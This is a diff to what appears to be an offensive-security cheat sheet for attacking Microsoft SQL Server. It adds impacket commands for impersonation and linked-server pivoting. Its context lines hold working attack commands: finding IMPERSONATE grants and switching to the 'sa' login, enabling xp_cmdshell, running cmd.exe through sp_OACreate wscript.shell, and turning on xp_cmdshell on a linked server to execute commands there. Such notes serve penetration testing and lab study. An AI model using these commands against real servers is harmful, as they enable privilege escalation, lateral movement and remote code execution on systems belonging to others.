@@ -467,11 +467,15 @@ help
 # impersonate
 SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
 EXECUTE AS LOGIN = 'sa';
+## impacket
+enum_impersonate
+exec_as_login sa
 ## revert
 REVERT;
 
 # xp_cmdshell
 enable_xp_cmdshell
+disable_xp_cmdshell
 
 EXECUTE sp_configure 'show advanced options', 1;
 RECONFIGURE;
@@ -486,8 +490,12 @@ DECLARE @output varchar(8000);
 EXEC @output = sp_OACreate 'wscript.shell', @objShell Output;
 EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';
 
-# Link Server
+# Link Server list
 EXEC sp_linkedservers;
+## link server
+use_link SQL02
+use_link localhost
+
 SELECT * FROM OPENQUERY(SQL02, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
 EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "whoami";') AT SQL02;
 
